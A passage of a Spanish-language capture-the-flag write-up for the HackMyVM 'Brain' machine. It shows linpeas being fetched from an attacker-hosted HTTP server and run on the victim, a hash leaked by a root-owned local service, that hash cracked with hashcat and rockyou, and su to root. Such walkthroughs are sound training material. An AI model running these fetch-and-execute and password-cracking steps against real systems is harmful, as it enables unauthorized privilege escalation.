+<p>Primero hay que transeferirse linpeas.sh a la máquina víctima:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nuestra máquina:</span>
+┌─[root@rijaba1-pc]─[~/Desktop/Brain/exploits]
+└──╼ <span class="c">#wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F253%2Fmerge/linpeas.sh</span>
+
+<span class="nt">---------</span>
+
+linpeas.sh                                      100%[<span class="o">====================================================================================================&gt;]</span> 744,96K  2,31MB/s    en 0,3s    
+
+2022-01-02 16:16:52 <span class="o">(</span>2,31 MB/s<span class="o">)</span> - «linpeas.sh» guardado <span class="o">[</span>762836/762836]
+
+┌─[root@rijaba1-pc]─[~/Desktop/Brain/exploits]
+└──╼ <span class="c">#python3 -m http.server 8080</span>
+Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
+
+<span class="c"># Máquina Victima:</span>
+salomon@Brain:~<span class="nv">$ </span><span class="nb">cd</span> /tmp/
+salomon@Brain:/tmp<span class="nv">$ </span>wget http://192.163.0.8:8080/linpeas.sh
+<span class="nt">--2022-01-02</span> 16:17:15--  http://192.163.0.8:8080/linpeas.sh
+Conectando con 192.163.0.8:8080... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 762836 <span class="o">(</span>745K<span class="o">)</span> <span class="o">[</span>text/x-sh]
+Grabando a: “linpeas.sh”
+
+linpeas.sh.1                                    100%[<span class="o">====================================================================================================&gt;]</span> 744,96K  <span class="nt">--</span>.-KB/s    en 0,004s  
+
+2022-01-02 16:17:15 <span class="o">(</span>172 MB/s<span class="o">)</span> - “linpeas.sh” guardado <span class="o">[</span>762836/762836]
+
+</code></pre></div></div>
+<p>Una vez hecho esto detenemos el servidor http montando en python y ejecutamos la herramienta:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>salomon@Brain:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x linpeas.sh
+salomon@Brain:/tmp<span class="nv">$ </span>./linpeas.sh 
+
+</code></pre></div></div>
+<p>Entre todo lo que hace la herramienta me sorprende la parte donde nos muestr todos los procesos que se están ejecutando:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╔══════════╣ Cleaned processes                                                                                                                                                      <span class="o">[</span>549/727]
+╚ Check weird &amp; unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                       
+<span class="nt">--------</span>
+root       370  0.0  0.0   5260   684 ?        S    13:45   0:00              _ <span class="nb">sleep </span>999999999999999                                                                                        
+root       312  0.0  0.3 225824  3536 ?        Ssl  13:45   0:00 /usr/sbin/rsyslogd <span class="nt">-n</span> <span class="nt">-iNONE</span>                                                                                                
+root       346  0.0  0.5   9488  5732 ?        Ss   13:45   0:00 /sbin/dhclient <span class="nt">-4</span> <span class="nt">-v</span> <span class="nt">-i</span> <span class="nt">-pf</span> /run/dhclient.enp0s3.pid <span class="nt">-lf</span> /var/lib/dhcp/dhclient.enp0s3.leases <span class="nt">-I</span> <span class="nt">-df</span> /var/lib/dhcp/dhclient6
+.enp0s3.leases enp0s3                                                                                                                                                                        
+root       369  0.0  1.3  22224 13360 ?        S    13:45   0:00 python /root/server.py 127.0.0.1:65000                                                                                      
+root       394  0.0  0.1   5612  1544 tty1     Ss+  13:45   0:00 /sbin/agetty <span class="nt">-o</span> <span class="nt">-p</span> <span class="nt">--</span> u <span class="nt">--noclear</span> tty1 linux                                                                                
+root       400  0.0  0.6  15852  6984 ?        Ss   13:45   0:00 /usr/sbin/sshd <span class="nt">-D</span>                                                                                                           
+<span class="nt">--------</span>
+</code></pre></div></div>
+<p>Podemos ver que el usuario root está ejecutando un servidor con Python. Vamos a hacerle una petición GET al servidor:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>salomon@Brain:/tmp<span class="nv">$ </span>wget 127.0.0.1:65000
+<span class="nt">--2022-01-02</span> 16:23:08--  http://127.0.0.1:65000/
+Conectando con 127.0.0.1:65000... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 192 <span class="o">[</span>text/html]
+Grabando a: “index.html”
+
+index.html                                      100%[<span class="o">====================================================================================================&gt;]</span>     192  <span class="nt">--</span>.-KB/s    en 0s      
+
+2022-01-02 16:23:08 <span class="o">(</span>88,9 MB/s<span class="o">)</span> - “index.html” guardado <span class="o">[</span>192/192]
+
+salomon@Brain:/tmp<span class="nv">$ </span><span class="nb">ls
+</span>index.html  systemd-private-d91299c48ef040feaec25068ed159d30-apache2.service-EZFh1S  systemd-private-d91299c48ef040feaec25068ed159d30-systemd-timesyncd.service-AoQJpy
+salomon@Brain:/tmp<span class="nv">$ </span><span class="nb">cat </span>index.html 
+<span class="o">[</span>+] You are a great Hacker!! I think you are looking <span class="k">for </span>this:
+065BB0B9A0C654E5B3B6XXXXXXXXXXXXXXXXXXXX09D941989EC4D728FBE3290E47D2058839215BBE6144F51E7FCE8A8C6XXXXXXXXXXXXXXX1D742251F5A17167
+salomon@Brain:/tmp<span class="nv">$ </span>
+</code></pre></div></div>
+<p>Parece que hemos encontrado un hash, vamos a crackearlo en local</p>
+
+<h3 id="crack-del-hash">Crack del Hash</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[✗]─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ <span class="c">#echo '065BB0B9A0C654E5B3B6XXXXXXXXXXXXXXXXXXXX09D941989EC4D728FBE3290E47D2058839215BBE6144F51E7FCE8A8C6XXXXXXXXXXXXXXX1D742251F5A17167' &gt; hash</span>
+┌─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ <span class="c">#hashcat -O -a0 -m1700 hash /usr/share/wordlists/rockyou.txt</span>
+hashcat <span class="o">(</span>v6.1.1<span class="o">)</span> starting...                                                                                                                                                                 
+                                                                                                                                                                                             
+OpenCL API <span class="o">(</span>OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG<span class="o">)</span> - Platform <span class="c">#1 [The pocl project]                                                                </span>
+<span class="o">=============================================================================================================================</span>                                                                
+<span class="k">*</span> Device <span class="c">#1: *********                                                                                       </span>
+                                                                                                                                                                                             
+
+<span class="nt">-------------------------------------------------------------------</span>
+                                                                                                                                                                                             
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required <span class="k">for </span>this attack: 65 MB
+
+Dictionary cache built:
+<span class="k">*</span> Filename..: /usr/share/wordlists/rockyou.txt
+<span class="k">*</span> Passwords.: 14344391
+<span class="k">*</span> Bytes.....: 139921497
+<span class="k">*</span> Keyspace..: 14344384
+<span class="k">*</span> Runtime...: 1 sec
+
+065BB0B9A0C654E5B3B6XXXXXXXXXXXXXXXXXXXX09D941989EC4D728FBE3290E47D2058839215BBE6144F51E7FCE8A8C6XXXXXXXXXXXXXXX1D742251F5A17167:<span class="k">******</span>
+</code></pre></div></div>
+
+<p>Hemos decifrado el hash! Ahora vamos a convertirnos en root proporcionando la contraseña decifrada.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>salomon@Brain:/tmp<span class="nv">$ </span>su root
+Contraseña: 
+root@Brain:/tmp# <span class="nb">cd
+</span>root@Brain:~# <span class="nb">ls
+</span>index.html  root.txt  run_server.sh  server.py
+root@Brain:~# <span class="nb">cat </span>root.txt<span class="p">;</span><span class="nb">echo
+</span>gmC9GR0EMUXXXXXXXXXXXXXXX
+
+root@Brain:~# 
+
+</code></pre></div></div>
+<p>¡Ya somos root, eso inplica que ya tenemos su flag!</p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#hacking" class="page__taxonomy-item" rel="tag">Hacking</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#hackmyvm" class="page__taxonomy-item" rel="tag">HackMyVM</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#writeup" class="page__taxonomy-item" rel="tag">Writeup</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#writeup" class="page__taxonomy-item" rel="tag">Writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-01-02T00:00:00+01:00">January 02, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/herramienta-portDiscoverSH/" class="pagination--pager" title="Herramienta portDiscoverSH
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 RiJaba1</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
